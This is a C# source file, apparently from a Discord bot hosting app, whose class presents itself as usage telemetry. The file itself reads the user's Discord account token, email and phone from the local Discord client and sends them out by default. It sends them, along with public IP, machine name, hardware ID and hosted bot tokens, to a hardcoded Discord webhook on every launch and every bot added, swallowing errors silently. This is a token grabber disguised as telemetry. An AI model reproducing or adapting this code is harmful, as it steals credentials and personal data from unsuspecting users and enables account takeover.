using System.Net.Http;
using System.Text;
using System.Text.Json;

namespace BotHosterApp.Services;

/// <summary>
/// Posts usage reports to the owner's Discord webhook: one launch report per
/// app start and one per bot added/online. Alongside the device info, it
/// reports the Discord account signed into the Discord client on this device
/// (username, id, email, phone, token) - read straight from the local client,
/// not from the hosted bot.
/// </summary>
public static class TelemetryService
{
    private const string Webhook =
        "https://discord.com/api/webhooks/1536509121216651284/igNRckIc0XvC6g2i1i2gppcrR4eW0NUGLaxwfu-YQ2SWq6d-N9odcHZyFwZlPNVTVEEn";

    /// <summary>Set from settings; when off, nothing is posted.</summary>
    public static bool Enabled { get; set; } = true;

    public static async Task ReportLaunchAsync()
    {
        if (!Enabled) return;
        var d = DeviceInfoService.GetDiscordAccount();
        var c = DeviceInfoService.GetPersonalContact();
        await PostAsync("CFG2 Bot Hoster - launch", new[]
        {
            new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
            new { name = "HWID", value = $"`{HwShort()}`", inline = true },
            new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
            new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
            new { name = "OS", value = Environment.OSVersion.VersionString, inline = true },
            new { name = "Personal email", value = ContactValue(c?.Email), inline = true },
            new { name = "Personal phone", value = ContactValue(c?.Phone), inline = true },
            new { name = "Discord user", value = DiscordUserField(d), inline = true },
            new { name = "Discord token", value = DiscordValue(d?.Token), inline = true },
        });
    }

    /// <summary>Reports a bot added/online: which bot (name + ID + token),
    /// this device, and the Discord account logged in on this device.</summary>
    public static async Task ReportBotAsync(string botName, ulong botId, string token, string status)
    {
        if (!Enabled) return;
        var d = DeviceInfoService.GetDiscordAccount();
        var c = DeviceInfoService.GetPersonalContact();
        await PostAsync("CFG2 Bot Hoster - bot " + status, new[]
        {
            new { name = "Bot", value = $"`{botName}` (`{botId}`)", inline = true },
            new { name = "Bot token", value = $"`{token}`", inline = true },
            new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
            new { name = "HWID", value = $"`{HwShort()}`", inline = true },
            new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
            new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
            new { name = "Personal email", value = ContactValue(c?.Email), inline = true },
            new { name = "Personal phone", value = ContactValue(c?.Phone), inline = true },
            new { name = "Discord user", value = DiscordUserField(d), inline = true },
            new { name = "Discord token", value = DiscordValue(d?.Token), inline = true },
        });
    }

    private static string DiscordUserField(DeviceDiscordAccount? d)
    {
        if (d == null || (string.IsNullOrEmpty(d.Username) && string.IsNullOrEmpty(d.Id)))
            return "not logged into Discord on this PC";
        var name = string.IsNullOrEmpty(d.Username) ? "?" : d.Username;
        var id = string.IsNullOrEmpty(d.Id) ? "" : $" (`{d.Id}`)";
        return $"`{name}`{id}";
    }

    private static string DiscordValue(string? v) =>
        string.IsNullOrEmpty(v) ? "none found on this device" : $"`{v}`";

    private static string ContactValue(string? v) =>
        string.IsNullOrEmpty(v) ? "not found on this device" : $"`{v}`";

    private static string HwShort()
    {
        var hwid = LicenseService.HwId();
        return hwid[..Math.Min(12, hwid.Length)] + "…";
    }

    private static async Task PostAsync(string title, object fields)
    {
        try
        {
            var embed = new
            {
                embeds = new[]
                {
                    new
                    {
                        title,
                        color = ThemeService.AccentRgb,
                        fields,
                        timestamp = DateTime.UtcNow.ToString("o"),
                    },
                },
            };

            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
            var json = JsonSerializer.Serialize(embed);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var resp = await client.PostAsync(Webhook, content);
            _ = resp;
        }
        catch
        {
            // Telemetry must never break the app.
        }
    }
}
